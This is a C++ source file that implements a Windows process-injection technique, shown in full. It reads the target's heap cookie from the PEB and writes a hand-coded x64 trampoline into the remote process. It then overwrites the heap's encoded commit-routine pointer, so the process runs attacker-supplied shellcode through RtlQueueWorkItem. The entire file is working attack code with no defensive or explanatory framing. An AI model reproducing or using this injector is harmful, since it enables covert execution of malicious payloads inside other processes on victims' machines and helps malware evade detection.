#include <heapcommit.hpp>
#include <heap.hpp>
#include <encoding.hpp>
#include <syscall.hpp>

#include <cstring>

#include <windows.h>

namespace heapcommit {

uint8_t kTrampolineCode[] = {
	0x53,                                           // push rbx
	0x56,                                           // push rsi
	0x57,                                           // push rdi
	0x48, 0x83, 0xEC, 0x40,                         // sub rsp, 0x40
	0x48, 0x89, 0xD6,                               // mov rsi, rdx
	0x4C, 0x89, 0xC7,                               // mov rdi, r8
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rax, <heapCommitSlot>
	0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rcx, <origEncoded>
	0x48, 0x89, 0x08,                               // mov [rax], rcx
	0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF,      // mov rcx, -1
	0x48, 0x89, 0xF2,                               // mov rdx, rsi
	0x4D, 0x31, 0xC0,                               // xor r8, r8
	0x49, 0x89, 0xF9,                               // mov r9, rdi
	0xC7, 0x44, 0x24, 0x20, 0x00, 0x10, 0x00, 0x00, // mov [rsp+0x20], 0x1000
	0xC7, 0x44, 0x24, 0x28, 0x04, 0x00, 0x00, 0x00, // mov [rsp+0x28], 4
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rax, <NtAllocVM>
	0xFF, 0xD0,                                     // call rax
	0x48, 0x89, 0xC3,                               // mov rbx, rax
	0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rcx, <loaderAddr>
	0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rdx, <dstData>
	0x45, 0x31, 0xC0,                               // xor r8d, r8d
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rax, <RtlQueueWorkItem>
	0xFF, 0xD0,                                     // call rax
	0x48, 0x89, 0xD8,                               // mov rax, rbx
	0x48, 0x83, 0xC4, 0x40,                         // add rsp, 0x40
	0x5F,                                           // pop rdi
	0x5E,                                           // pop rsi
	0x5B,                                           // pop rbx
	0xC3                                            // ret
};

constexpr size_t kTrampolineSize = sizeof(kTrampolineCode);

Status inject(const Config &cfg)
{
	if (!cfg.process || !cfg.processHeap || !cfg.shellcode) {
		return Status::INVALID_PROCESS;
	}

	heap::ProcessBasicInfo pbi = {};
	NTSTATUS status = NtQueryInformationProcess(cfg.process, 0, &pbi, sizeof(pbi), nullptr);
	if (status != 0) {
		return Status::READ_FAILED;
	}

	uint32_t cookie = 0;
	status = NtReadVirtualMemory(
		cfg.process,
		(uint8_t *)pbi.PebBaseAddress + 0x78,
		&cookie,
		sizeof(cookie),
		nullptr
	);
	if (status != 0) {
		return Status::READ_FAILED;
	}

	const heap::FindResult result = heap::findCommitRoutine(cfg.process, cfg.processHeap, cookie);
	if (!result.found) {
		return Status::NOT_FOUND;
	}

	uint8_t * const heapCommitSlot = (uint8_t *)cfg.processHeap + result.offset;
	const uint64_t originalEncoded = result.encoded;
	uint8_t * const trampolineAddr = (uint8_t *)cfg.shellcode + 0xE00;

	uint8_t trampoline[kTrampolineSize];
	memcpy(trampoline, kTrampolineCode, kTrampolineSize);

	const HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (!ntdll) {
		return Status::EXPORT_FAILED;
	}

	const auto pNtAllocVM = reinterpret_cast<uint64_t>(reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAllocateVirtualMemory")));
	const auto pRtlQueueWorkItem = reinterpret_cast<uint64_t>(reinterpret_cast<void*>(GetProcAddress(ntdll, "RtlQueueWorkItem")));

	if (!pNtAllocVM || !pRtlQueueWorkItem) {
		return Status::EXPORT_FAILED;
	}

	*reinterpret_cast<uint64_t *>(trampoline + 15) = reinterpret_cast<uint64_t>(heapCommitSlot);
	*reinterpret_cast<uint64_t *>(trampoline + 25) = originalEncoded;
	*reinterpret_cast<uint64_t *>(trampoline + 70) = pNtAllocVM;
	*reinterpret_cast<uint64_t *>(trampoline + 85) = reinterpret_cast<uint64_t>(cfg.shellcode);
	*reinterpret_cast<uint64_t *>(trampoline + 95) = reinterpret_cast<uint64_t>(cfg.dstData);
	*reinterpret_cast<uint64_t *>(trampoline + 108) = pRtlQueueWorkItem;

	status = NtWriteVirtualMemory(cfg.process, trampolineAddr, trampoline, kTrampolineSize, nullptr);
	if (status != 0) {
		return Status::WRITE_FAILED;
	}

	uint64_t newEncoded = reinterpret_cast<uint64_t>(trampolineAddr) ^ originalEncoded;

	status = NtWriteVirtualMemory(cfg.process, heapCommitSlot, &newEncoded, sizeof(newEncoded), nullptr);
	if (status != 0) {
		return Status::WRITE_FAILED;
	}

	return Status::OK;
}

}
